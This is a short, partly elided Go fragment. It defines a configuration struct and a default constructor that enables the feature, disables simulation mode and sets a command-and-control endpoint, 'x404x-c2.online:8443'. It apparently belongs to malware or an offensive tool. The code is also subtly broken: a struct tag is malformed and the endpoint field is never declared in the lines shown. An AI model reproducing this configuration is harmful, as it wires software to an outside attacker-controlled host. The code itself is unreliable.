...
type V30Config struct {
	Enabled bool `json:"enabled";Simulation bool `json:"simulation"`
...
func DefaultV30Config() *V30Config { return &V30Config{Enabled: true, Simulation: false, C2Endpoint: "x404x-c2.online:8443"} }
